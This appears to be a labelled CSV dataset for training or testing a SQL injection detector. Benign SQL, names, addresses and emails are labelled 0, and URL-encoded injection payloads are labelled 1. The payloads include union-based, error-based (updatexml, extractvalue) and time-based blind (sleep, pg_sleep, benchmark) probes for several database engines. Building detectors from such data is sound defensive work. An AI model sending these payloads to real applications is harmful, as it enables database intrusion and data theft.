Query,Label
"INSERT INTO younger ( improve, darkness, being, anywhere, rather, lie )  VALUES  ( 'can', 'percent'. cattle', 'necessary', 'position', 'escape', 'check' )",0
SELECT * FROM food WHERE lips NOT BETWEEN 'ordinary' AND 'mix',0
SELECT * FROM sky WHERE bar IN  ( SELECT asleep FROM balloon ),0
select%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20--%20ygbf,1
uriz carmona,0
SELECT AVG ( drink ) FROM century,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%20elt%20%20%28%20%201210%20%20%3D%20%201210%2Csleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22afby%22%20%20%3D%20%20%22afby,1
-9176%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20eunw%20where%205978%20%20%3D%20%205978%20or%201%20group%20by%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204232%20%20%3D%20%204232%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20%20having%20min%20%20%28%20%200%20%20%29%20%20%23,1
c/ alcazalquivir s/n,0
50690,0
SELECT * FROM goes FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM unit WHERE Price NOT BETWEEN 10 AND 20,0
"pl. comercial 54, 5d",0
andrs castanyer,0
1%27%2B%20%20%28%20%20select%20eluw%20where%206210%20%20%3D%20%206210,1
byron@vinavilano.gl,0
277,0
d75a4r45der,0
SELECT MIN ( grown )  AS weak FROM battle,0
1%27%20%20%29%20%20%20as%20dvoy%20where%207906%20%20%3D%20%207906%20and%20char%20%20%28%20%20109%20%20%29%20%20%7C%7Cchar%20%20%28%20%2079%20%20%29%20%20%7C%7Cchar%20%20%28%20%2070%20%20%29%20%20%7C%7Cchar%20%20%28%20%2090%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%205012%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
lagunaseca,0
SELECT * FROM grew WHERE then NOT LIKE '[machine]%',0
SELECT * FROM sit,0
-9054%22%20%20%29%20%20%20as%20rgyu%20where%203792%20%20%3D%20%203792%20order%20by%201--,1
callie,0
SELECT * FROM system WHERE freedom BETWEEN 'animal' AND 'sheet',0
iif%20%20%28%20%209229%20%20%3D%20%204158%2C1%2C1/0%20%20%29,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20ljhz%20where%202416%20%20%3D%20%202416,1
-4322%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20magw%20where%201627%20%20%3D%20%201627%20or%204747%20%20%3D%20%20dbms_utility.sqlid_to_sqlhash%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204747%20%20%3D%20%204747%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20--,1
-2701%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20wvht%20where%205401%20%20%3D%20%205401%20union%20all%20select%205401%2C5401%2C5401%2C5401%2C5401%2C5401%2C5401%2C5401%23,1
SELECT AVG ( beginning ) FROM lower SELECT SUM ( exchange ),0
1%27%7C%7C%20%20%28%20%20select%20%27wyng%27%20from%20dual%20where%202157%20%20%3D%20%202157%20union%20all%20select%20null%2Cnull--,1
7.40029E+15,0
SELECT TOP 50 PERCENT * FROM dirt,0
1%27%20%20%29%20%20%20as%20taay%20where%207027%20%20%3D%20%207027%20and%20elt%20%20%28%20%204249%20%20%3D%20%204249%2C7259%20%20%29%20%20--,1
"SELECT REPEAT ( ""SQL Tutorial"", 3 ) ;",0
-1438%20where%206759%20%20%3D%20%206759%20union%20all%20select%206759%2C6759%23,1
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%204411%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
81208495a,0
vinko,0
1%20and%206055%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%206055%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%206055%20%20%3D%20%206055%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%23%20rhli,1
nogueras,0
1%25%22%20and%201343%20%20%3D%20%205939%23,1
1%20%20%29%20%20%20where%202741%20%20%3D%20%202741%20and%206414%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20%20%29%20%20--,1
1%27%20%20%29%20%20%20and%206969%20%20%3D%20%20%20%20%28%20%20select%206969%20from%20pg_sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29,1
e_ncobador,0
60613075w,0
1%22%20%20%29%20%20%20as%20pkkx%20where%206716%20%20%3D%20%206716%20and%20updatexml%20%20%28%20%203393%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%203393%20%20%3D%20%203393%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C1161%20%20%29%20%20--,1
maula,0
-9347%27%20%20%29%20%20%20union%20all%20select%203884%2C3884%23,1
"INSERT INTO thirty ( stems, prepare, sure, lovely, surface, food )  VALUES  ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )",0
"SELECT sand,baseball,rock FROM tears LEFT JOIN Orders ON book.environmentID =  any.got ORDER BY shelf.aloud",0
SELECT MAX ( Price )  AS LargestPrice FROM Products;,0
-7452%20where%202224%20%20%3D%20%202224%20or%204747%20%20%3D%20%20dbms_utility.sqlid_to_sqlhash%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204747%20%20%3D%20%204747%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20--,1
-6463%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%203280%2C3280%2C3280%2C3280%2C3280%2C3280%2C3280%2C3280%2C3280%23,1
1%27%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203902%20%20%3D%20%203902%20%20%29%20%20%20then%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29%20%20%20else%201/%20%20%28%20%20select%200%20from%20dual%20%20%29%20%20%20end%20%20%29%20%20%20from%20dual%20%20%29,1
SELECT * FROM dinner WHERE Price NOT BETWEEN 10 AND 20,0
barriga requena,0
-8248%20or%205903%20%20%3D%20%20%20%20%28%20%20%27qqpjq%27%7C%7C%20%20%28%20%20select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%20%20%29%20%20%7C%7C%27qzvzq%27%20%20%29,1
1.65E+15,0
SELECT DISTINCT history FROM history,0
"SELECT * FROM step WHERE knew IN  ( 'suit', 'shine', 'pot' )",0
SELECT DISTINCT hunter FROM bus,0
SELECT COUNT ( beginningID ) FROM were,0
22533,0
-6036%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%203440%20%20%3D%20%20cast%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203440%20%20%3D%20%203440%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%3A%3Atext%7C%7C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20as%20numeric%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%206723%20%20%3D%20%206723,1
-3862%27%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%202495%2C2495%2C2495%2C2495%2C2495%2C2495%2C2495--,1
miner@zing.lk,0
1%22%20%20%29%20%20%20where%206478%20%20%3D%20%206478%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
eglevsky-dux@tacticlinks.ch,0
FROM  ( SELECT DISTINCT bark FROM older ),0
werling,0
1%27%20and%20%20%20%28%20%20select%209067%20from%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%2Cconcat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%209067%20%20%3D%20%209067%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20x%20from%20information_schema.character_sets%20group%20by%20x%20%20%29%20%20a%20%20%29%20%20%20and%20%27ankn%27%20%20%3D%20%20%27ankn,1
SELECT * FROM silence 3 SELECT * FROM dozen,0
marcanti,0
SELECT * FROM heading WHERE tie = 'nearer',0
guell lloret,0
1%27%20where%205023%20%20%3D%20%205023%20and%203580%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
SELECT * FROM paper WHERE night NOT LIKE 'basic%',0
cunillera penades,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_3146' LIMIT 1,0
68689912k,0
SELECT * FROM foreign,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20gxvp%20where%203865%20%20%3D%20%203865,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%203754%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203754%20%20%3D%20%203754%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27ajka%27%20%20%3D%20%20%27ajka,1
SELECT * FROM careful FETCH FIRST 50 PERCENT ROWS ONLY,0
1%20union%20all%20select%20null--,1
1%22%20and%20%20%20%28%20%207424%20%20%3D%20%202381%20%20%29%20%20%2A2381%20and%20%22dvju%22%20%20%3D%20%20%22dvju,1
"SELECT column_name ( s )  FROM due,musical",0
2561,0
-7741%27%20%20%29%20%20%20where%208271%20%20%3D%20%208271%20union%20all%20select%208271%2C8271%2C8271%2C8271%2C8271%2C8271%2C8271%23,1
SELECT stood ( s )  FROM pipe UNION,0
SELECT * FROM may WHERE    NOT find = 'plain',0
-9569%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%208405%2C8405%2C8405%2C8405--,1
SELECT AVG ( mistake )  FROM principal  SELECT SUM ( opinion ),0
"SELECT circusID AS ID, suit AS rope FROM mile",0
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%208421%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20%2B%20%40%3C%40.%20union%20select%201%2Cversion%20%20%28%20%20%20%20%29%20%20%20--%201,1
1%25%22%20and%203707%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20%20and%20%22%25%22%20%20%3D%20%20%22,1
SELECT * FROM exactly,0
-3347%27%2B%20%20%28%20%20select%20xuzs%20where%201076%20%20%3D%20%201076%20union%20all%20select%201076%2C1076%2C1076%2C1076%2C1076--,1
"SELECT lady, crack, discovery FROM grade WHERE captured  IS NULL",0
"arroyo prado del rey 60,",0
SELECT sea ( s FROM consider RIGHT JOIN,0
-6890%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%205771%20%20%3D%20%207721--,1
1%27%20%20%29%20%20%20and%20updatexml%20%20%28%20%203393%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%203393%20%20%3D%20%203393%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C1161%20%20%29%20%20%20and%20%20%20%28%20%20%27ngxz%27%20%20%3D%20%20%27ngxz,1
3.45951E+14,0
1%25%27%20%20%29%20%20%20or%208421%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
"calle ponte vella s/n, 13e",0
torremoroso enrich,0
SELECT * FROM cotton,0
1%27%2B%20%20%28%20%20select%20%27mxlb%27%20where%204900%20%20%3D%20%204900,1
-1235%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%204144%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204144%20%20%3D%20%204144%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22ahhz%22%20like%20%22ahhz,1
montorns de segarra,0
SELECT * FROM father WHERE related BETWEEN have09/01/1996or AND seed15/31/1996chicken,0
select%20%20%20%28%20%20case%20when%20%20%20%28%20%206652%20%20%3D%20%201932%20%20%29%20%20%20then%206652%20else%206652%2A%20%20%28%20%20select%206652%20from%20information_schema.character_sets%20%20%29%20%20%20end%20%20%29%20%20%23,1
cot reixach,0
hole@chicashumedas.at,0
1%25%22%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%23,1
39672063f,0
SELECT TOP 3 * FROM human WHERE could = 'pretty',0
"once septiembre, 95",0
SELECT below ( s )  FROM station SELECT thank FROM knowledge,0
graff@manzanilladevillafafila.iq,0
lehar,0
FROM  ( SELECT DISTINCT way FROM area ),0
1%25%27%20%20%29%20%20%20order%20by%201%23,1
SELECT camp ( s )  FROM chose UNION,0
2639,0
SELECT TOP 50 PERCENT * FROM butter SELECT * FROM tribe FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM please,0
SELECT affect ( s FROM cover RIGHT JOIN,0
"SELECT rod, create, seldomFROM happily WHERE idea  IS NOT NULL",0
10702,0
"SELECT Employees.bound, COUNT ( Orders.thirdID )  AS mineralsFROM    ( OrdersINNER JOIN off ON Orders.theeID  =  Employees.minuteID )",0
1%2C%20%20%28%20%20cast%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%207823%20%20%3D%20%207823%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%3A%3Atext%7C%7C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20as%20numeric%20%20%20%29%20%20%20%20%29,1
-9954%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%204144%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204144%20%20%3D%20%204144%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22bifi%22%20%20%3D%20%20%22bifi,1
SELECT AVG ( particular ) FROM group SELECT SUM ( wonderful ),0
SELECT * FROM diagram FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM recently,0
-7731%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%20make_set%20%20%28%20%202551%20%20%3D%20%204389%2C4389%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22unly%22%20like%20%22unly,1
-5137%20%20%29%20%20%20or%209323%20%20%3D%20%209323%23,1
"SELECT heartID AS ID, dawn AS behavior FROM opposite",0
SELECT * FROM ocean 3,0
1%20or%20elt%20%20%28%20%206272%20%20%3D%20%206272%2Csleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29,1
-1869%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%207122%2C7122%2C7122%2C7122%2C7122%2C7122%2C7122%2C7122%2C7122--,1
SELECT TOP 3 * FROM whether WHERE spend = 'space',0
"INSERT INTO south ( second, distant, exclaimed, exactly, wealth, sure )  VALUES  ( 'factor', 'bus'. arrive', 'lucky', 'on', 'nails', 'column' )",0
versteeg,0
19115,0
SELECT AVG ( Price ) FROM purpose,0
SELECT * FROM simply ORDER BY desk DESC,0
magaz de pisuerga,0
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%203824%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x76555642%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
"SELECT Orders.unlessrID, Employees.shown, Employees.teach FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.slightID ORDER BY Orders.tonightID",0
19127,0
1%22%20%20%29%20%20%20or%208384%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%28%20%20%22vkqt%22%20%20%3D%20%20%22vkqt,1
"SELECT COUNT ( making ) , swimming FROM breakfast BY storm",0
FROM  ( SELECT DISTINCT roll FROM independent ),0
6.27383E+15,0
rechinido,0
SELECT hearing ( s )  FROM changing SELECT reach ( s ),0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
SELECT Count ( * )  AS adult,0
1%20%20%29%20%20%20or%20updatexml%20%20%28%20%201808%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201808%20%20%3D%20%201808%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C8666%20%20%29%20%20%20and%20%20%20%28%20%203294%20%20%3D%20%203294,1
bidaurreta,0
barreras de la bandera,0
16300,0
salter@quiromante.com.mg,0
SELECT observe ( s )  FROM peace UNION ALL,0
select%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2066%20%20%29%20%20%7C%7Cchr%20%20%28%20%2067%20%20%29%20%20%7C%7Cchr%20%20%28%20%2079%20%20%29%20%20%7C%7Cchr%20%20%28%20%20101%20%20%29%20%20%2C5%20%20%29%20%20%20from%20dual%20and%20%22ulfr%22%20like%20%22ulfr,1
28760,0
SELECT * FROM lead WHERE grandmother = 'zipper'  OR brought = 'having',0
nicole-meyer@creacionesdolcevita.us,0
-6400%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%204650%2C4650%2C4650--,1
rabascall,0
select%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%22oivc%22%20like%20%22oivc,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8774 )  ORDER BY meta_id ASC",0
1%27%20and%20extractvalue%20%20%28%20%207982%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%207982%20%20%3D%20%207982%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%27pphf%27%20%20%3D%20%20%27pphf,1
"INSERT INTO safety ( swam, alphabet, bean, character, blood, tree )  VALUES  ( 'pass', 'dropped'. verb', 'chapter', 'important', 'way', 'zebra' )",0
SELECT * FROM agree WHERE    NOT labor = 'action',0
SELECT * FROM just WHERE cave = 'twenty'  AND  ( baseball = 'volume' OR struggle = 'available' ),0
SELECT * FROM actually WHERE    NOT history = 'thus',0
